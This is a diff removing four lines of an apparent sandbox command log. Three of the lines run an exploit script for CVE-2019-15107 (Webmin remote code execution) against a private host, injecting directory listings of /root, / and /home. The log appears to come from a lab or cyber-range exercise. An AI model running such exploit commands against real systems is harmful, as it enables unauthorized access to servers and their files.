@@ -1,4 +1,0 @@
-{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:35:02.119099+02:00", "cmd_type": "bash-command", "cmd": "ls"}
-{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:35:14.469587+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'ls /root'"}
-{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:35:21.203336+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'ls /'"}
-{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:35:32.014300+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'ls -al /home'"}
